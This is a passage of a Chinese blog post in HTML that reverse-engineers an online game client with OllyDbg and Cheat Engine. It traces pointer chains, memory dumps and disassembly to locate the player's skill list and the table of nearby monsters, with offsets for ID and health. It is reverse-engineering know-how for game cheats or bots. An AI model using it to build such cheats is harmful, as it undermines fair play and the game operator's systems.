01297268  ElementC.01297268</span><br><span class=\"line\">495A614C  605D0978  技能信息</span><br><span class=\"line\">495A6150  0000007D</span><br><span class=\"line\">495A6154  00000005</span><br><span class=\"line\">495A6158  00000000</span><br><span class=\"line\">495A615C  00000000</span><br><span class=\"line\">495A6160  000003E8</span><br><span class=\"line\">495A6164  00726F00  ElementC.00726F00</span><br><span class=\"line\"></span><br><span class=\"line\">605D0978  0203A5AC  ElementS.0203A5AC</span><br><span class=\"line\">605D097C  023F72B0  ElementS.023F72B0 技能详细信息</span><br><span class=\"line\">605D0980  00000000</span><br><span class=\"line\">605D0984  00000000</span><br><span class=\"line\">605D0988  00000000</span><br><span class=\"line\">605D098C  00000000</span><br><span class=\"line\">605D0990  00000000</span><br><span class=\"line\">605D0994  00000000</span><br><span class=\"line\">605D0998  00000000</span><br><span class=\"line\">605D099C  00000000</span><br><span class=\"line\">605D09A0  00000000</span><br><span class=\"line\">605D09A4  00000000</span><br><span class=\"line\">605D09A8  00000000</span><br><span class=\"line\">605D09AC  0000007D</span><br><span class=\"line\">605D09B0  00000005</span><br><span class=\"line\"></span><br><span class=\"line\">023F72B0  02110B04  ElementS.02110B04</span><br><span class=\"line\">023F72B4  0000007D</span><br><span class=\"line\">023F72B8  00000007</span><br><span class=\"line\">023F72BC  020DBFE4  ElementS.020DBFE4  技能名称</span><br><span class=\"line\">023F72C0  020DBFEC  ElementS.020DBFEC</span><br><span class=\"line\">023F72C4  020DBFF4  ElementS.020DBFF4</span><br><span class=\"line\">023F72C8  0000000A</span><br><span class=\"line\">023F72CC  00020001</span><br><span class=\"line\">023F72D0  00000000</span><br><span class=\"line\"></span><br><span class=\"line\">020DBFE4  7BAD7FBD</span><br><span class=\"line\">020DBFE8  00000000</span><br><span class=\"line\">020DBFEC  FDBCF0D3</span><br><span class=\"line\">020DBFF0  00000000</span><br><span class=\"line\">020DBFF4  FDBCF0D3</span><br><span class=\"line\"></span><br><span class=\"line\">020DBFE4  羽箭..</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>猜测：技能列表使用一个数组存储的</p>\n<p>通过 OD 中下断点 <code>push dword ptr ds:[eax+0x8]</code>  在 OD 中 eax 的值</p>\n<p>491B2710 A7</p>\n<p>4B637FE8 71</p>\n<p>491B2828 72</p>\n<p>491B29B0 7D</p>\n<p>491A5200 7F</p>\n<h4 id=\"角色人物技能列表\"><a class=\"markdownIt-Anchor\" href=\"#角色人物技能列表\">#</a> 角色人物技能列表</h4>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230103134451637.png\" alt=\"image-20230103134451637\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230103134511620.png\" alt=\"image-20230103134511620\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">432CF230  4B637FE8</span><br><span class=\"line\">432CF234  491B2828</span><br><span class=\"line\">432CF238  491B29B0</span><br><span class=\"line\">432CF23C  491A5200</span><br><span class=\"line\">432CF240  491B2710</span><br><span class=\"line\">432CF244  CDD0A3C4</span><br><span class=\"line\">[432CF230]</span><br><span class=\"line\"></span><br><span class=\"line\">4B637FE8  01297268  ElementC.01297268</span><br><span class=\"line\">4B637FEC  4C573D48</span><br><span class=\"line\">4B637FF0  00000071</span><br><span class=\"line\">4B637FF4  00000005</span><br><span class=\"line\">4B637FF8  00000000</span><br><span class=\"line\">4B637FFC  00000000</span><br><span class=\"line\">4B638000  000003E8</span><br><span class=\"line\">[[432CF230]+4]</span><br><span class=\"line\"></span><br><span class=\"line\">4C573D48  0208A5AC  ElementS.0208A5AC</span><br><span class=\"line\">4C573D4C  0244D660  ElementS.0244D660</span><br><span class=\"line\">4C573D50  00000000</span><br><span class=\"line\">4C573D54  00000000</span><br><span class=\"line\">4C573D58  00000000</span><br><span class=\"line\">4C573D5C  00000000</span><br><span class=\"line\">[[[432CF230]+4]+4]</span><br><span class=\"line\"></span><br><span class=\"line\">0244D660  02160550  ElementS.02160550</span><br><span class=\"line\">0244D664  00000071</span><br><span class=\"line\">0244D668  00000007</span><br><span class=\"line\">0244D66C  021605A8  ElementS.021605A8</span><br><span class=\"line\">0244D670  021605B0  ElementS.021605B0</span><br><span class=\"line\">0244D674  021605B8  ElementS.021605B8</span><br><span class=\"line\">0244D678  0000000A</span><br><span class=\"line\">0244D67C  00000002</span><br><span class=\"line\">[[[[432CF230]+4]+4]+0x0C]</span><br><span class=\"line\"></span><br><span class=\"line\">021605A8  5FC36E05</span><br><span class=\"line\">021605AC  00005492</span><br><span class=\"line\">021605B0  C4D0E5C7</span><br><span class=\"line\">021605B4  0000E4D6</span><br><span class=\"line\">021605B8  C4D0E5C7</span><br><span class=\"line\">021605BC  642EE4D6</span><br><span class=\"line\"></span><br><span class=\"line\">021605A8  清心咒.쓐</span><br><span class=\"line\">[[[[432CF230]+4]+4]+0x0C] = 清心咒</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230103135837650.png\" alt=\"image-20230103135837650\"></p>\n<p>2EEDD430 - [[[14FEE38]+1C]+30] = 2EEDD430 - 2EEDAC10 = 2820</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2EEDD430  432CF230   人物技能列表</span><br><span class=\"line\">2EEDD434  00000005   人物技能列表长度</span><br><span class=\"line\">2EEDD438  00000010</span><br><span class=\"line\">2EEDD43C  00000010</span><br><span class=\"line\">2EEDD440  01276380  ElementC.01276380</span><br><span class=\"line\">2EEDD444  011ED3B8  ElementC.011ED3B8</span><br><span class=\"line\">2EEDD448  00000000</span><br><span class=\"line\">2EEDD44C  00000000</span><br><span class=\"line\">2EEDD450  00000000</span><br><span class=\"line\">2EEDD454  00000010</span><br><span class=\"line\"></span><br><span class=\"line\">dd [[[14FEE38]+1C]+30] + 2820 = 2EEDD430</span><br></pre></td></tr></table></figure>\n<h4 id=\"人物周围怪物\"><a class=\"markdownIt-Anchor\" href=\"#人物周围怪物\">#</a> 人物周围怪物</h4>\n<p>猜想：怪物</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Monster</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    m_dwMonsterID;</span><br><span class=\"line\">    MonsterInfo monIfo;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MonsterInfo</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">\tm_strMonsterName;</span><br><span class=\"line\">    m_dwMonsterID;</span><br><span class=\"line\">    m_Mode;</span><br><span class=\"line\">    m_MonsterGrade;</span><br><span class=\"line\">    m_MonsterShengMing;</span><br><span class=\"line\">    m_MonsterMaxShengMing;</span><br><span class=\"line\">    m_Monster_X_POS;</span><br><span class=\"line\">    m_Monster_Y_POS;</span><br><span class=\"line\">    m_Monster_Z_POS;</span><br><span class=\"line\">    m_MonsterType;    <span class=\"comment\">//npc,monster</span></span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230105211901057.png\" alt=\"image-20230105211901057\"></p>\n<p>00BE9BA4 - 8B 86 18010000  - mov eax,[esi+00000118]  ESI=5F21EBA8</p>\n<p>思路一：</p>\n<p>在游戏中用 CE 搜索怪物的相关信息 (怪物的 ID，生命，名字等信息) 定位到怪物对象的地址，然后通过 OD 下访问断点，找到相关代码，分析代码逻辑，最终找到怪物列表</p>\n<p>思路二：</p>\n<p>网游通过 send 函数断点分析相关操作</p>\n<p>1. 怪物的信息偏移地址分析</p>\n<p>2. 人物周围的怪物列表</p>\n<p>80001C4A</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00BE7E26 - 89 88 2C010000  - mov [eax+0000012C],ecx</span><br><span class=\"line\"></span><br><span class=\"line\">eax = 3EB9CE70</span><br><span class=\"line\"></span><br><span class=\"line\">$+124    00000010 .... </span><br><span class=\"line\">$+128    00000000 .... </span><br><span class=\"line\">$+12C    000003BE ¾... </span><br><span class=\"line\">$+180    00000000 .... </span><br><span class=\"line\">$+184    000003BE ¾... </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00C1BD4B - 8B B8 18010000  - mov edi,[eax+00000118]</span><br><span class=\"line\">00C1BD48              | 8B46 04                | mov eax,dword ptr ds:[esi+4]                   | 3EB978D0</span><br><span class=\"line\">00C1BD4B              | 8BB8 18010000          | mov edi,dword ptr ds:[eax+118]                 | 80001C46</span><br><span class=\"line\">00C1BD51              | 8BB0 B4000000          | mov esi,dword ptr ds:[eax+B4]                  | 00000006</span><br><span class=\"line\">00C1BD57              | E8 F40D0100            | call elementclient.C2CB50                      |</span><br><span class=\"line\"></span><br><span class=\"line\">00BE9BA4 - 8B 86 18010000  - mov eax,[esi+00000118]</span><br><span class=\"line\"></span><br><span class=\"line\">00C17B6A - 8B BF 18010000  - mov edi,[edi+00000118]   3EB9CE70</span><br><span class=\"line\">00C17B64              | 8BB7 B4000000          | mov esi,dword ptr ds:[edi+B4]                  | 00000006</span><br><span class=\"line\">00C17B6A              | 8BBF 18010000          | mov edi,dword ptr ds:[edi+118]                 | 80001C4A</span><br><span class=\"line\">00C17B70              | E8 DB4F0100            | call elementclient.C2CB50                      |</span><br><span class=\"line\"></span><br><span class=\"line\">00BE8603 - 8B 86 18010000  - mov eax,[esi+00000118]</span><br><span class=\"line\">00BE8601              | 8B36                   | mov esi,dword ptr ds:[esi]                     |</span><br><span class=\"line\">00BE8603              | 8B86 18010000          | mov eax,dword ptr ds:[esi+118]                 |</span><br><span class=\"line\"></span><br><span class=\"line\">00BE7E26 - 89 88 2C010000  - mov [eax+0000012C],ecx</span><br><span class=\"line\">00BE7E23              | 8B4E 04                | mov ecx,dword ptr ds:[esi+4]                   | 00000291</span><br><span class=\"line\">00BE7E26              | 8988 2C010000          | mov dword ptr ds:[eax+12C],ecx                 | </span><br><span class=\"line\">00BE7E2C              | 8B4E 08                | mov ecx,dword ptr ds:[esi+8]                   | 000003BE</span><br><span class=\"line\">00BE7E2F              | 8988 84010000          | mov dword ptr ds:[eax+184],ecx                 | </span><br><span class=\"line\">00BE7E35              | 8B4E 0C                | mov ecx,dword ptr ds:[esi+C]                   |</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00F30DED              | 8B89 EC000000          | mov ecx,dword ptr ds:[ecx+EC]                  | </span><br><span class=\"line\">00F30DF3              | 8B45 08                | mov eax,dword ptr ss:[ebp+8]                   |</span><br><span class=\"line\">00F30DF6              | 8B0481                 | mov eax,dword ptr ds:[ecx+eax*4]               |</span><br><span class=\"line\">00F30DF9              | 85C0                   | test eax,eax                                   |</span><br><span class=\"line\">00C50D74              | E8 67002E00            | call elementclient.F30DE0                      |</span><br><span class=\"line\"></span><br><span class=\"line\">00B69BBB - FF B3 18010000  - push [ebx+00000118]</span><br><span class=\"line\"></span><br><span class=\"line\">00B69BBB              | FFB3 18010000          | push dword ptr ds:[ebx+118]                    |</span><br><span class=\"line\">00B69BC1              | F3:0F114424 18         | movss dword ptr ss:[esp+18],xmm0               |</span><br><span class=\"line\">00B69BC7              | E8 64BAECFF            | call elementclient.A35630                      |</span><br><span class=\"line\"></span><br><span class=\"line\">00C15CAB - FF B7 18010000  - push [edi+00000118]</span><br><span class=\"line\"></span><br><span class=\"line\">00C15CE5 - FF B7 18010000  - push [edi+00000118]</span><br><span class=\"line\">00C15CD5              | 8B75 18                | mov esi,dword ptr ss:[ebp+18]                  |</span><br><span class=\"line\">00C15CD8              | 8B4D F0                | mov ecx,dword ptr ss:[ebp-10]                  |</span><br><span class=\"line\">00C15CDB              | 53                     | push ebx                                       |</span><br><span class=\"line\">00C15CDC              | FF75 14                | push dword ptr ss:[ebp+14]                     |</span><br><span class=\"line\">00C15CDF              | 56                     | push esi                                       |</span><br><span class=\"line\">00C15CE0              | 6A 00                  | push 0                                         |</span><br><span class=\"line\">00C15CE2              | FF75 08                | push dword ptr ss:[ebp+8]                      |</span><br><span class=\"line\">00C15CE5              | FFB7 18010000          | push dword ptr ds:[edi+118]                    |</span><br><span class=\"line\">00C15CEB              | E8 9067FCFF            | call elementclient.BDC480                      |</span><br><span class=\"line\"></span><br><span class=\"line\">00C1DE59 - 8B B8 18010000  - mov edi,[eax+00000118]</span><br><span class=\"line\"></span><br><span class=\"line\">00BE7E15   &gt; \\8B72 0C       mov esi,dword ptr ds:[edx+0xC]           ;  6FC422FA</span><br><span class=\"line\">00BE7E18   .  FF36          push dword ptr ds:[esi]    80001C4A</span><br><span class=\"line\">00BE7E1A   .  E8 010E0000   call ElementC.00BE8C20    </span><br><span class=\"line\">00BE7E1F   .  85C0          test eax,eax   2A532888</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00A4AA6F              | E8 1C030000            | call elementclient.A4AD90             |</span><br><span class=\"line\"></span><br><span class=\"line\">00A4AD94              | 8BF9                   | mov edi,ecx                           |</span><br><span class=\"line\"></span><br><span class=\"line\">00A4AE03              | 8B8F 98000000          | mov ecx,dword ptr ds:[edi+98]         |</span><br><span class=\"line\"></span><br><span class=\"line\">00A4AE0E              | E8 4DA21900            | call elementclient.BE5060             |</span><br><span class=\"line\"></span><br><span class=\"line\">00BE5088              | 8BF1                   | mov esi,ecx                           |</span><br><span class=\"line\"></span><br><span class=\"line\">00BE50B1              | 8B46 04                | mov eax,dword ptr ds:[esi+4]          |</span><br><span class=\"line\">00BE50B4              | 8B40 1C                | mov eax,dword ptr ds:[eax+1C]         |</span><br><span class=\"line\"></span><br><span class=\"line\">00BE50BB              | 8B4C88 1C              | mov ecx,dword ptr ds:[eax+ecx*4+1C]   | eax = 095D9D28 ecx = 2</span><br><span class=\"line\">00BE50BF              | 85C9                   | test ecx,ecx                          |</span><br><span class=\"line\">00BE50C1              | 74 29                  | je elementclient.BE50EC               |</span><br><span class=\"line\">00BE50C3              | 8B01                   | mov eax,dword ptr ds:[ecx]            |</span><br><span class=\"line\">00BE50C5              | 8D55 D4                | lea edx,dword ptr ss:[ebp-2C]         |</span><br><span class=\"line\">00BE50C8              | 52                     | push edx                              |</span><br><span class=\"line\">00BE50C9              | FF50 34                | call dword ptr ds:[eax+34]            |</span><br><span class=\"line\"></span><br><span class=\"line\">00BE8150              | E8 7BFBFFFF            | call elementclient.BE7CD0             |</span><br><span class=\"line\"></span><br><span class=\"line\">00BE7E15   &gt; \\8B72 0C       mov esi,dword ptr ds:[edx+0xC]          1C677902</span><br><span class=\"line\">00BE7E18   .  FF36          push dword ptr ds:[esi]                 80001C4A</span><br><span class=\"line\">00BE7E1A   .  E8 010E0000   call ElementC.00BE8C20</span><br><span class=\"line\">00BE7E1F   .  85C0          test eax,eax                            37327F00</span><br><span class=\"line\">00BE7E21   .  74 60         je XElementC.00BE7E83</span><br><span class=\"line\">00BE7E23   .  8B4E 04       mov ecx,dword ptr ds:[esi+0x4]</span><br><span class=\"line\">00BE7E26   .  8988 2C010000 mov dword ptr ds:[eax+0x12C],ecx</span><br><span class=\"line\">00BE7E2C   .  8B4E 08       mov ecx,dword ptr ds:[esi+0x8]</span><br><span class=\"line\">00BE7E2F   .  8988 84010000 mov dword ptr ds:[eax+0x184],ecx</span><br><span class=\"line\">00BE7E35   .  8B4E 0C       mov ecx,dword ptr ds:[esi+0xC]</span><br><span class=\"line\"></span><br><span class=\"line\">call 00BE8C20通过怪物ID得到怪物对象</span><br><span class=\"line\">00BE8C20  /$  55            push ebp</span><br><span class=\"line\">00BE8C21  |.  8BEC          mov ebp,esp</span><br><span class=\"line\">00BE8C23  |.  83EC 08       sub esp,0x8</span><br><span class=\"line\">00BE8C26  |.  56            push esi</span><br><span class=\"line\">00BE8C27  |.  8BF1          mov esi,ecx</span><br><span class=\"line\">00BE8C29  |.  8D45 08       lea eax,[arg.1]</span><br><span class=\"line\">00BE8C2C  |.  50            push eax</span><br><span class=\"line\">00BE8C2D  |.  8D45 F8       lea eax,[local.2]</span><br><span class=\"line\">00BE8C30  |.  50            push eax</span><br><span class=\"line\">00BE8C31  |.  8D4E 14       lea ecx,dword ptr ds:[esi+0x14]    esi = 0A3F6DD8</span><br><span class=\"line\">00BE8C34  |.  E8 57130000   call ElementC.00BE9F90</span><br><span class=\"line\"></span><br><span class=\"line\">00BE9F90   $  55            push ebp</span><br><span class=\"line\">00BE9F91   .  8BEC          mov ebp,esp</span><br><span class=\"line\">00BE9F93   .  8B45 0C       mov eax,dword ptr ss:[ebp+0xC]    0019EECC</span><br><span class=\"line\">00BE9F96   .  33D2          xor edx,edx</span><br><span class=\"line\">00BE9F98   .  56            push esi   0A3F6DD8 </span><br><span class=\"line\">00BE9F99   .  8B30          mov esi,dword ptr ds:[eax]   80001C4A</span><br><span class=\"line\">00BE9F9B   .  8BC6          mov eax,esi</span><br><span class=\"line\">00BE9F9D   .  F771 14       div dword ptr ds:[ecx+0x14]      eax/301   edx = 000002CB   ecx = 0A3F6DEC</span><br><span class=\"line\">00BE9FA0   .  8B41 08       mov eax,dword ptr ds:[ecx+0x8]  58A9B678 怪物列表地址</span><br><span class=\"line\">00BE9FA3   .  8B0490        mov eax,dword ptr ds:[eax+edx*4]  4F46B068 </span><br><span class=\"line\">00BE9FA6   .  85C0          test eax,eax</span><br><span class=\"line\">00BE9FA8   .  74 11         je XElementC.00BE9FBB</span><br><span class=\"line\">00BE9FB0   &gt;  3970 08       cmp dword ptr ds:[eax+0x8],esi</span><br><span class=\"line\">00BE9FB3   .  74 18         je XElementC.00BE9FCD</span><br><span class=\"line\">00BE9FB5   .  8B00          mov eax,dword ptr ds:[eax]</span><br><span class=\"line\">00BE9FB7   .  85C0          test eax,eax</span><br><span class=\"line\">00BE9FB9   .^ 75 F5         jnz XElementC.00BE9FB0</span><br><span class=\"line\">00BE9FBB   &gt;  8B45 08       mov eax,dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">00BE9FBE   .  5E            pop esi</span><br><span class=\"line\">00BE9FBF   .  C700 00000000 mov dword ptr ds:[eax],0x0</span><br><span class=\"line\">00BE9FC5   .  C640 04 00    mov byte ptr ds:[eax+0x4],0x0</span><br><span class=\"line\">00BE9FC9   .  5D            pop ebp</span><br><span class=\"line\">00BE9FCA   .  C2 0800       retn 0x8 </span><br><span class=\"line\">00BE9FCD              | 8B4D 08                | mov ecx,dword ptr ss:[ebp+8]                      0019EEBC</span><br><span class=\"line\">00BE9FD0              | 83C0 04                | add eax,4                                      |  4F46B06C</span><br><span class=\"line\">00BE9FD3              | 5E                     | pop esi                                        | 0A3F6DD8</span><br><span class=\"line\">00BE9FD4              | 8901                   | mov dword ptr ds:[ecx],eax                     | </span><br><span class=\"line\">00BE9FD6              | 8BC1                   | mov eax,ecx                                    | 0019EEBC</span><br><span class=\"line\">00BE9FD8              | C641 04 01             | mov byte ptr ds:[ecx+4],1                      |</span><br><span class=\"line\">00BE9FDC              | 5D                     | pop ebp                                        |</span><br><span class=\"line\">00BE9FDD              | C2 0800                | ret 8                                          |</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">怪物对象通过this指针偏移得到ID，当前血量和最大血量 </span><br><span class=\"line\">+ 12C</span><br><span class=\"line\">+ 184</span><br><span class=\"line\">+ 118</span><br><span class=\"line\"></span><br><span class=\"line\">0A3F6DEC     00000000  .... </span><br><span class=\"line\">0A3F6DF0     0000001E  .... </span><br><span class=\"line\">0A3F6DF4     58A9B678  x¶©X </span><br><span class=\"line\">0A3F6DF8     58A9C27C  |Â©X </span><br><span 